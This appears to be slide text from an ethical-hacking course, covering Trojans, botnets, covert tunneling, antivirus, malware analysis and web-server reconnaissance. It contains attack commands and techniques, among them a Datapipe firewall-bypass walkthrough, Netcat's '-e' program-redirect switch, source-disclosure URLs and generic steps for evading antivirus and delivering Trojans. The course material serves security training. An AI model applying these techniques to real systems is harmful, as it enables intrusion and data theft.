[slide17.xml] Trojan Tools (Tini) Tini is small backdoor Trojan that is about 3KB.  Tini was written for Windows and listens at TCP port 7777  and gives anybody who connects a remote command prompt.  The disadvantage to the hacker is that the tool always listens on port 7777.  Because the port cannot be changed, it is easy for a penetration tester to scan for and find this open port.
[slide18.xml] Remote-Access Trojan (RAT)  RATs provide the attacker with remote administrative control over the victim’s computer.  RATs are usually executed invisibly when an infected attachment such as a .pdf, .ppt, .doc, or .xls document is opened. Examples; BlackHole RAT, NetBus, Poison Ivy.
[slide19.xml] Some Remote-Access Trojans (RATs)  NetBus Opens two TCP ports numbered 12345 and 12346.  Uses  12345  to listen for a remote client and responds to the client via port  12346 . NetBus  can even be instructed to send an email when it runs for the first time to notify the hacker that it has been installed.  Also capable of redirecting input to a specified port to another IP address via the server machine.  This means that the remote user can do mischief on a third machine someplace on the Net and his connection will appear to come from the redirecting address. Tini A small backdoor Trojan that is about 3KB.  Tini  was written for Windows and listens at TCP port 7777  and gives anybody who connects a remote command prompt. 
[slide20.xml] Botnets A  botnet  is a collection of zombie computers, or  bots , that is controlled by a hacker, or  bot herder . What most botnets have in common is that they are designed to make money.  Botnets may be used to send spam, install Trojans, attempt pump-and-dump stock manipulation, attempt extortion, or even launch DDoS attacks.  An end user’s computer can become infected by visiting a malicious site, clicking the wrong email attachment, or following a link in a social networking site.  Even legitimate websites can lead to infection. Once the end user’s computer is infected, the bot herder can use it for any number of illegal activities. Botnets get started when the bot herder starts the propagation process and spreads the malware to unprotected computers.  Once those systems are infected as bots, they may scan and infect other unprotected computers, thereby adding more zombie computers to the botnet.  The bot herder usually communicates with the infected systems via Internet Relay Chat (IRC).  Some bots are controlled via private peer-to-peer (P2P) networks. A P2P network is a network in which any node in the network can act as both a client and a server.  Some botnets work by hiding behind an ever-changing network of compromised hosts that act as proxies.  This allows IP addresses to be swapped out quickly and makes it much harder for law enforcement to shut down the botnet. 
[slide21.xml] Well-known botnets Zeus Citadel Storm Mariposa Rustock Mirai Silentbank
[slide22.xml] Its about the Benjamins Silentbanker: Once infected, the malware waits until the computer is used for a banking transaction.  Then, Silentbanker changes the user’s bank account details over to the attacker’s account, while displaying the original banking  transaction.   Because users have no idea their account data has been modified, they then unknowingly send money  to the attacker’s bank account.  Common Banking Trojans ones include the following: TAN Grabber :  The bot intercepts the transaction authentication number and replaces it with invalid number to be used by the client. The attacker uses the valid number to perform banking transactions. HTML Injection :  Creates fake form fields to be displayed to the end user. Form Grabber :  Captures and modifies the POST requests and alters information.
[slide23.xml] GhostRat  This Trojan was designed to turn on the webcam, record audio, and enable built-in internal microphones to spy on people. This Trojan was delivered by PDF and was deployed on more than one thousand computers. 
[slide24.xml] Wrappers vs Packers vs Crypters Wrapper A program used to combine two or more executables into a single packaged program.  BurnEye is an example of a wrapper program. Packers  A re similar to programs such as WinZip in that they compress files.  However, whereas compression programs compress files to save space, packers do this to obfuscate (hide) the activity of the malware.  Packers serve a second valuable goal to the attacker in that they work to bypass network security protection mechanisms, such as HIDSs and NIDSs.  The malware packer will only decompress the program when in memory, revealing the program’s original code only when executed. Crypters  Programs that obscure the contents of the Trojan by applying an encryption algorithm
[slide25.xml] Trojan Tool Kits Trojan Horse Construction Kit This command-line utility enables you to construct a Trojan horse with a multitude of destructive behavior, such as destroying the partition table, master boot record (MBR), or even the entire hard drive. Senna Spy  It is capable of many types of custom options, such as file transfer, executing DOS commands, keyboard control, and list and control processes. Stealth tool Is not a Trojan construction kit, but it’s close. Stealth tool is a program designed to make Trojans harder to detect.  Its purpose is to change up the file by adding bytes, changing strings, or splitting and combining files. It includes a fake version of netstat to further help the hacker hide his deeds.
[slide26.xml] A trojan attack The steps to successfully deploy a Trojan usually include the following: Create Trojan or possess Trojan application. Modify the existing Trojan so that it is not detected by current antivirus. Bind the Trojan with a legitimate file. The Trojan may be bound with an EXE, PPT, PDF, XLS, or other file type to aid in propagation. Transmit the wrapped Trojan to the victim for execution.
[slide27.xml] Covert communications The Computer System Evaluation Criteria (TCSEC) divides covert channel attacks into two broad categories, Timing and Storage: Covert timing channel attacks :  Conveys information by monitoring some aspect of system behavior over time, so that the program receiving the information can observe system behavior and infer protected information In some instances, knowing when data is transmitted between parties can provide a malicious user with privileged information.  Covert storage channel attacks Uses one process to write data to a storage area and another process to read the data. Examples Using a file intended to hold only audit information to convey user passwords Using the name of a file or perhaps status bits associated with the file  that can be read by all users can be used  to signal the contents of the file.  Steganography, concealing information in such a manner that no one but the intended recipient knows of the existence of the message, is a good example of a covert storage channel. 
[slide28.xml] Using Linux to fill ICMP Options Data field The last field in the ICMP header, is for Optional Data. What’s transported there depends on the system.  Linux fills the Optional Data area with numeric values by counting up, whereas a Windows system progresses through the alphabet.  The Optional Data field was actually designed just to be filler. It helps meet the minimum packet size needed to be a legal packet.  The Linux ping command includes the -p option, which allows the user to specify the optional data. Therefore, a user could enter just about anything he wanted into the field. For this example, the following ASCII string is used: [root@localhost root]# ping -p 2b2b2b415448300 192.168.123.101
[slide29.xml] ICMP Tunneling/Covert Communication Tools ICMP backdoor:  An ICMP backdoor program has the advantage of using only ping reply packets. Because it does not pad up short messages or divide large messages, some IDSs can easily detect that the traffic is not composed of actual ICMP packets.  Loki  a ICMP covert communication trojan 007Shell:  This is an ICMP covert communication program that takes the extra step of rounding out each packet to ensure that it has 64 bytes of data, so that it appears as a normal ping packet. ICMPSend:  This is an ICMP covert communication program that uses ping packets to covertly exfiltrate data.
[slide30.xml] Tunneling via the Transport Layer UDP is stateless and, as such, may not be logged in firewall connections; some UDP-based applications such as DNS are typically allowed through the firewall and may not be watched closely by network and firewall administrators.  UDP port 53 are 53 are most likely open. This means it’s also open for attackers to use as a potential means to exfiltrate data.  UDP tunnel tools including the following: UDP Tunnel:  Also designed to tunnel TCP traffic over a UDP connection. dnscat:  Another option for tunneling data over an open DNS connection. 
[slide31.xml] Tunneling via the Application Layer Application layer tunneling uses common applications that send data on allowed ports.  As an example, a hacker may tunnel a web session, normally on port 80, through SSH port 22 or even through port 443.  Because ports 22 and 443 both use encryption, it can be difficult to monitor the difference between a legitimate session and a covert channel.
[slide32.xml] Tunneling via the Application Layer Netcat  is one tool that can be used to set up a tunnel to exfiltrate data over HTTP.  If HTTPS is the transport, it is difficult for the network administrator to inspect the outbound data.   Cryptcat can be used to send data over HTTPS. Domain Name System (DNS)  can be used for application layer tunneling.  DNS is a request/reply protocol.  Its queries consist of a 12-byte fixed-size header followed by one or more questions.  A DNS response is formatted in much the same way in that it has a header, followed by the original question, and then typically a single-answer resource record.  The most straightforward way to manipulate DNS is by means of these request/replies. 
[slide33.xml] Port redirection  Port redirection works by using ports that aren’t normally used for program communications.   Some tools used for port redirection include Datapipe, FPipe, and Netcat.  What is great about these tools is that they are protocol ignorant. They don’t care what you pass, they will pass anything you any data you wish;  Port redirectors simply act as the pipe to pass data from point A to point  B.
[slide34.xml] Research Question What is  Netcat ? Why does the  ec -council consider “ Netcat ” a Trojan? Netcat  cheat sheet https://kapeli.com/cheat_sheets/Netcat.docset/Contents/Resources/Documents/index
[slide35.xml] Common Netcat Switches Nc -d Used to detach Netcat from the console. Nc -l -p [port] Used to create a simple listening TCP port.  Adding -u will place it into UDP mode. Nc -e [program] Used to redirect stdin/stdout from a program to Netcat. Nc -w [timeout] Used to set a timeout before Netcat automatically quits. Program | nc Used to pipe output of program to Netcat. Nc | program Used to pipe output of Netcat to program. Nc -h Used to display help options. Nc -v Used to put Netcat into verbose mode. Nc -g or nc -G Used to specify source routing flags. -g is gateway source routing, -G is numeric source routing. Nc -t Used for Telnet negotiation DON'T and WON'T . Nc -o [file] Used to hex dump traffic to file. Nc -z Used for port scanning. Example of using Netcat and Datapipe on Page 224
[slide36.xml] Port Redirection using Datapipe The hacker has compromised a Linux host 10.2.2.254 on the inside of the network and has uploaded the Datapipe.  Now, the hacker would like to set up a null session on Windows systems (10.2.2.2) inside the compromised network.  The problem is that the firewall is blocking port 139.  Therefore, there is no direct way for the hacker to set up a null session. That’s where Datapipe come in.  From the compromised Linux system, the hacker runs the following command: datapipe 80 139 10.2.2.2 On the hacker’s local Linux system, he enters the following: datapipe 139 80 10.2.2.254
[slide37.xml] Port Redirection using Datapipe The compromised Linux system was instructed to take traffic coming from the Windows system (our target). He did it by using  port redirection to move any traffic on port 139 over to port 80.  Why redirect traffic to port 80, because everyone has port 80 open for HTTP traffic.  Which means that we slip past the firewall. On the hacker’s local system, Datapipe was instructed to take traffic on port 80 and use port redirection to move it back over to 139.  At this point, a null session and its undetected by the firewall.
[slide38.xml] Spyware Another form of malicious code. It is installed without your consent or knowledge, hidden from view, monitors your computer and Internet usage, and is configured to run in the background each time the computer starts.  Spyware is usually used for one of two purposes, surveillance or advertising: Surveillance : Used to determine your buying habits, discover your likes and dislikes, and report this demographic information to paying marketers. Advertising : You’re targeted for advertising that the spyware vendor has been paid to deliver.  For example, the maker of a rhinestone cell phone case might have paid the spyware vendor for 100,000 pop-up ads. If you have been infected, expect to receive more than your share of these unwanted pop-up ads.
[slide39.xml] Spyware Droppers Spyware sites and vendors use droppers to covertly drop their spyware components to the victim’s computer.   Basically, a dropper is just another name for a wrapper, a dropper is just a standalone program that drops different types of standalone malware onto a system.  To force the spyware to restart each time the system boots, code is usually hidden in the Registry run keys, the Windows Startup folder, the Windows load= or run= lines found in the Win.ini file, or the Shell= line found in the Windows System.ini.  List of Spyware Droppers on Page 227
[slide40.xml] Anti-Virus 5 Point Plan Overall, the best way to prevent viruses is by following an easy five-point plan: Install antivirus software. Keep the virus definitions up-to-date. Dated antivirus is not much better than no protection at all. Use common sense when dealing with attachments.  If you don’t know who it’s from, it’s something you didn’t request, or it looks suspicious, don’t open it! Keep the system patched. Many viruses exploit vulnerabilities that have previously been found and are well known. Be leery of attachments as even today it remains one of the primary means of spreading advanced persistent threats (APTs) and other malware such as viruses and worms.
[slide41.xml] Antivirus Although strategies to prevent viruses are a good first step, antivirus software has become an absolute essential software component. A number of antivirus products are on the market, including the following: Norton AntiVirus McAfee VirusScan Trend Micro PC-cillin Sophos Antivirus AVG Antivirus
[slide42.xml] Antivirus techniques  These techniques include Signature scanning Heuristic scanning Integrity checking Activity blocking
[slide43.xml] Signature-scanning  Signature-scanning antivirus software looks at the beginning and end of executable files for known virus signatures.   Signatures are nothing more than a series of bytes found in the virus’s code.   Here is an example of a virus signature: X5O!P%@AP[4\ PZX54(P^)7CC)7$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* If you copy this into a text file and rename it as an executable, your antivirus should flag it as a virus.   It is not actually a virus, and the code is harmless. It is just a tool developed by the European Institute of Computer Antivirus Research (EICAR) to test the functionality of antivirus software.   
[slide44.xml] Heuristic scanning  Examines computer files for irregular or unusual instructions. For example, think of your word processing program; it probably creates, opens, or updates text files.   If the word processor were to attempt to format the C: drive, this is something that heuristics would quickly identify, as that’s not the usual activity of a word processor.  In reality, antivirus vendors must strike a balance with heuristic scanning because they don’t want to produce too many false positives or false negatives.  Many antivirus vendors use a scoring technique that looks at many types of behaviors.   Only when the score exceeds a threshold does the antivirus actually flag an alert.
[slide45.xml] Integrity checking  Integrity checking can also be used to scan for viruses.   Integrity checking works by building a database of checksums or hashed values. These values are saved in a file.  Periodically, new scans occur, and the results are compared to the stored results. Although it isn’t effective for data files, this technique is useful for programs and applications because the contents of executable files rarely change.  For example, the MD5Sum of Nmap 5.1 is  d6579d0d904034d51b4985fa2764060e.  Any change to the Nmap program would change this hashed value and make it easy for an integrity checker to detect.
[slide46.xml] Activity blocker  An activity blocker intercepts a virus when it starts to execute and blocks it from infecting other programs or data.    Activity blockers are usually designed to start upon boot and continue until the computer is shut down.   One way to test suspected viruses, worms, and malware is to use on online virus checker.   One such service is Jotti’s virus scanning service.  It scans suspected files against many antivirus products.
[slide47.xml] Online Malware Detection tools These sites generally operate as a sandbox.    A good example of sandbox services include Joe Sandbox and ThreatExpert.  ThreatExpert executes files in a virtual environment much like VMware and Virtual PC. This great tool tracks changes made to the file system, Registry, memory, and network.  ThreatExpert even uses application programming interface (API) hooks that intercept the malware’s interactions in realtime. 
[slide48.xml] Online Malware tools Allow you to submit the suspected malware to many different antivirus services.    One such service is offered by  VirusTotal.com .  The website permits you to upload files via clear text, Secure Sockets Layer (SSL), or you can upload files via Windows Explorer. Submitted files are scanned by 40 different antivirus products.  Figure 5-11 on Page 236 shows an example of the site.  If you’re looking for a second opinion, you can also submit the potentially malicious code or application to  Jotti.org ; their services scan against 20 antivirus programs.
[slide49.xml] Malware Analysis There are two basic methods to analyze viruses and other malware: Static analysis Dynamic analysis
[slide50.xml] Static Analysis and Tools Static analysis is concerned with the decompiling, reverse engineering, and analysis of malicious software.    Static analysis makes use of disassemblers and decompilers to format the data into a human-readable format.  Static Analysis tools: IDA Pro: Is a disassembler that you can use for decompiling code.  It’s particularly useful in situations in which the source code is not available, such as with malware BinText: A text extractor. It can extract text from any kind of file and includes the ability to find plain ASCII text, Unicode text, and resource strings. UPX A packer, compression, and decompression tool. OllyDbg A debugger that allows for the analysis of binary code where source is unavailable.
[slide51.xml] Dynamic Analysis Dynamic analysis relates to the monitoring and analysis of computer activity and network traffic.   This requires the ability to configure the network device for monitoring, look for unusual or suspicious activity, and try not to alert attackers.  This approach requires the preparation of a test bed.  Before you begin setting up a dynamic analysis lab, just remember that the number one goal is to keep the malware contained. If you allow the host system to become compromised, you have defeated the entire purpose of the exercise.  Virtual systems share many resources with the host system and can quickly become compromised if the configuration is not handled correctly. 
[slide52.xml] Dynamic Analysis tools Process Monitor:  Allows for a review of running processes TCPview:  Identifies active services and applications NetResident:  Provides an in-depth analysis of network traffic Wireshark:  A well-known packet analyzer Capsa Network Analyzer : A commercial network analysis tool TCPdump : A command line network analysis tool Tripwire:  A well-known integrity verification tool
[slide53.xml] Techniques that can make disassembly challenging Encryption Obfuscation Encoding Anti-virtual machine Anti-debugger
[slide54.xml] Steps to prevent malware from escaping an isolated VM environment Install a virtual machine (VM). Install a guest operating system on the VM. Isolate the system from the guest VM. Verify that all sharing and transfer of data is blocked between the host operating system and the virtual system. Copy the malware over to the guest operating system and prepare for analysis.
[slide55.xml] FakeNet The malware may also look to see whether there is an active network connection. If not, it once again may refuse to run.  One tool to help overcome this barrier is FakeNet.  FakeNet simulates a network connection so that malware interacting with a remote host continues to run.
[slide56.xml] Anti-VM techniques  Malware authors sometimes use anti-VM techniques to thwart attempts at analysis.  If you try to run the malware in a VM, it might be designed not to execute.  For example, one simple way is to get the MAC address; if the OUI matches a VM vendor, the malware will not execute. OUI is short for Organizational Unique Identifier, the first 24 bits of a MAC address for a network-connected device, which indicate the specific vendor for that device.
[slide57.xml] Where malware hides If you are forced to detect the malware by discovering where it has installed itself on the local system, there are some known areas to review: Running processes Device drivers Windows services Startup programs Operating system files
[slide58.xml] The End

[slide1.xml] Chapter Fifteen Web Application Attacks, Web Servers & SQL Injection
[slide2.xml] Session Overview R e c on n ais s a nc e Scanning & Enumeration Kali  & Metasploit   Exploitation Meterpreter & Post-Exploitation Password Attacks Web  Attacks Wireless   Exploi ta tion Anti-Forensics
[slide3.xml] Web Background OS Bro w ser Webserver Database
[slide4.xml] Questions
[slide5.xml] Four stages of HTTP HTTP is based on TCP port 80/443 and has only four stages: Your web browser (client) opens a TCP connection request to the IP address on port 80/443. After completing a 3way handshake (server) the sever waits for a GET request from the client.  This Get request is asking for HTML from a specific web page. After receiving (server) the GET request from the client. The server completes the transaction by looking its storage of HTML code and responds with the appropriate HTML code. Your web browser (client) then closes the TCP connection.
[slide6.xml] HTTPS HTTPS takes the well-known and understood HTTP protocol, and simply layers a SSL/TLS encryption layer on top of it.    Servers and clients still speak exactly the same HTTP to each other, but over a secure SSL connection that encrypts and decrypts their requests and responses.   The SSL layer has 2 main purposes: Verifying that you are talking directly to the server that you think you are talking to Ensuring that only the server can read what you send it and only you can read what it sends back
[slide7.xml] Web server reconnaissance process Scanning : Tools such as Nmap and SuperScan can be used. Banner grabbing : Identifies the server and version. Netcat and Telnet are useful here. Vulnerability Scanning:  Tools used to identify vulnerabilities or items that are unpatched. OpenVAS and Nessus are two examples of vulnerability scanners
[slide8.xml] Scanning for Web Servers You cannot attack what you don’t know exists. Therefore, after you have a target range of IP addresses, you will want to look for web services.  Standard web servers run on port 80 or 443, but you should scan other ports when you look for web-based applications, including the following: 80/443: IIs (10% of market) NGINX 80/443 (39% of market 8005: Apache Tomcat (45% of market) 8080: Squid 9090: Sun Web Server Admin
[slide9.xml] Using Telnet errors to identify the Web server Just telnet to the site and watch for the results: C:\ >telnet www.knowthetrade.com 80 HTTP/1.1 400 Bad Request Server: Microsoft-IIS/7.5 Date: Mon, 27 May 2013 06:08:17 GMT Content-Type: text/html Content-Length: 87 <html><head><title>Error</title></head><body> The parameter is incorrect. </body> </html> Connection to host lost
[slide10.xml] Using Netcat to identify the Web server Netcat is also a useful tool to identify the web server.   With just three simple steps,  you’ll be ready for web server enumeration: 1. Create a text file called head.txt .  GET HEAD / 1.0 [carriage return] [carriage return] 2. Run Netcat with the following parameters: nc -vv webserver 80 < head.txt 3. Watch the results: HTTP/1.1 400 Bad Request Server: Microsoft-IIS/7.5 Date: Mon, 27 May 2013 04:12:01 GMT Content-Type: text/html Content-Length: 91 <html><head><title>Error</title></head><body> The parameter is incorrect. </body> </html> Connection to host lost.
[slide11.xml] Site rippers  Site rippers  enable you to mirror a website and make a duplicate that you can handily store on your hard drive.  These programs enable you to go through the site a page at a time and examine the HTML code to look for useful information.  Some tools to help you with this task are shown here: BlackWidow:  A Windows website scanner and site ripper.  Use it to scan a site and create a complete profile of the site’s structure, files, email addresses, external links, and even link errors.   Httprint :  This is a Windows website scanner and site-mapping tool. Use it to rip websites and review them at your leisure. Wget : A command-line tool for Windows and UNIX that will download the contents of a website and serve as an open source site ripper and duplicator. 
[slide12.xml] Top  Web Vulnerabilities Web Vulnerabilities Typically fall into one of the following categories Sample Files Sample product code snippets or sample scripts (e.g. – MS IIS 4.0) Allowed attackers to download ASP source code  Sample code (showcode.asp and codebrews.asp) Allowed for remote access and reveal contents of any file on the system Source Code Disclosure Allow a malicious user to view the source code of application files Can use with other techniques to view source of application files Classic example: IIS and .htr vulnerability Similar issues with Apache tomcat and BAE WebLogic Issues with appending special characters to requests for Java Server Pages (JSP) Example – http://www.weblogicserver.example/index.js%70 Example – http://www.lisserver.example/global.sas+.htr
[slide13.xml] Top  Web Vulnerabilities Web Vulnerabilities Typically fall into one of the following categories Canonicalization Is the process of resolving a resource to a standard canonical name Computer/Network Resources can be addressed with more than one representation Example file:  C:\sample.txt \\computer\\c$\sample.txt ..\\sample.txt Another Example: ASP::$DATA vulnerability in IIS Allowed the attacker to download Active Server Pages (ASP) verses having them rendered dynamically by the ASP engine Example code: http://192.168.10.10/scripts/file.asp::$DATA Server Extensions Extensions are code libraries that add onto the core of the HTTP engine Adds dynamic script execution, security, caching, etc. Past history vulnerabilities: MS indexing extension, Internet Printing Protocol, SSL (e.g. – Apache’s mod_ssl buffer overflow)
[slide14.xml] Top  Web Vulnerabilities Web Vulnerabilities Typically fall into one of the following categories Server Extensions WebDAV extensions have been notorious for vulnerabilities Allows multiple people to access, upload, and modifyweb files to a web server Translate: f causes the web server to fork execution over to a vulnerable add-on library It sends a malformed HTTP GET request for a server executable script (e.g. – ASP or Global.asa files) The request causes IIS to send content of a file to the remote client rather than execute it with the proper scripting engine Input Validation Insecure coding has allowed for attackers to enter code causing unauthorized actions SQL injection and Buffer Overflows are good examples Buffer Overflows have been an ongoing problem over the years Often results in executing arbitrary commands on the target  Example – IIS 5.0/5.1 and 6.0 had IIS ASP Stack Overflow vulnerabilities that allowed an attacker to place files on a web server that executed machine code into the contents of the web server software
[slide15.xml] H TML Code HTML Hyper Text Markup Language  Forms and Elements Comments HTTP HyperText  Transfer Protocol GET and POST Content-Length Comment  statement is ignored by the browser In some cases, it may reveal good indicators Starts with <!-- and Ends with --> ACTION  statement pointing to a server-side executable In this case, it is an ASP file Form elements will be sent to this URL METHOD  statement tells how the browser sends input This will be GET vs POST If not METHOD statement is shown, GET is the default  Form Elements Noted by <input TYPE= Many different types such as text Text from elements are seen on the web page with a small dialog box Hidden Form Elements These elements have predefined values via web apps They don’t appear on the web page (only via source code) They are not expected to be modified by the user When a user hits the submit button, these are transmitted back Elements are a way for the website to remember information about a user or pending transactions without server-side resources Size restrictions Two types:  SIZE  and  MAXLENGTH Implements size restrictions of the input SIZE  refers to dialog boxes MAXLENGTH  refers to the max length of input
[slide16.xml] HTML HTML Used to define a webpage  Browsers interpret HTML to create the visual webpage View HTML source code by right-clicking on the page and selecting ‘View Source’  HMTL Code HTML Comments begin with <!--  Ignored by the web browser Used by developers to document coding HTML Action Statements Points to a server-side code that executes on behalf of the web user Example: CGI script, ASP script, Java servlet Takes a user input, processes it, computes an output Think of a Google search
[slide17.xml] Get  vs. Post Two Methods to submit Form Data GET User input is within the URL requested POST User input is in the body of the request This form data is submitted from client to server Uses METHOD= Determines how the web browser will transmit the input Ultimately tells where the user data will be placed in the HTTP traffic
[slide18.xml] Secure Connections SSL & TLS Traffic is encrypted (data in transit) between web server and the web server Does not protect the application There is a possibility to manipulate at the client side by a malicious user We can use a proxy to manipulate the client side

[slide21.xml] Web  Tool Nikto2 Nikto2 Written by Chris Sullo and David Lodge http://cirt.net/nikto2 Open Source web server scanner Performs comprehensive tests against web servers Over 6400+ potentially dangerous files/CGIs Checks for outdated versions of 1200+ servers Checks for server configuration items: Multiple index files, HTTP server options Identifies web servers and software Scan items and plugins are updated frequently Can be done automatically It is not overly stealthy Conducts tests as quickly as possible Fairly obvious in log files Does support LibWhikers’s anti-IDS methods Can integrate Nikto into Nessus
[slide22.xml] Nikto2 Features Top Features SSL Support Full HTTP Proxy Support Checks for outdated Server Components Saves reports in plaintext, XML, HTML, NBE, or CSV Template engine to easily customize reports Scan multiple ports on a server, or multiple servers via input files (incl.  nmap  output) LibWhicker’s  IDS encoding techniques  Easily updated via the command line Identifies installed software via headers, favicons, and files Host authentication with Basic and NTLM Subdomain guessing Apache and  cgiwrap  username enumeration Mutation techniques to “fish” for content on web servers Scan tuning to include or exclude entire classes of vulnerability checks Guess credentials for authorization realms (incl. many default id/pw combos) Authorization guessing handles any directory, not just the root directory Enhanced false positive reduction via multiple methods: headers, page content, and content hashing A ‘single’ scan mode that allows you to craft an HTTP request by hand Reports ‘unusual’ headers seen Interactive status, pause, and changes to verbosity settings Logging to Metasploit
[slide23.xml] Running Nikto2 Run  Nikto  against a target nikto  -h [target address] -p 80 Scan on port 80, Run multiple ports by:  -p 80, 443 Output will be to the screen by default Use  -o [ filename ]  or  -output [ filename ]  to send output to a file Use  -format [ type ]  to save as xml, txt, csv, or  msf Using a proxy To use the  nikto.config  file PROXY variables Use  - useproxy  http://localhost:8080 SSL Test only, use  - ssl Seconds to wait before timing out -timeout  (default = 10 seconds) Tuning options  Control the tests run (default is all tests) Includes Example:  nikto  -h 192.168.10.10 -T 23xb
[slide24.xml] Interactive Mode Interactive Mode During a Scan Hot keys (below) turn on/off the listed feature Note: They are  case sensitive SPACE – Report current scan status v – Turn verbose mode on/off d – Turn debug mode on/off e – Turn error reporting on/off p – Turn progress reporting on/off r – Turn redirect display on/off c – Turn redirect display on/off o – Turn cookie display on/off a – Turn OK display on/off q – Turn auth display on/off N – Next host P - Pause
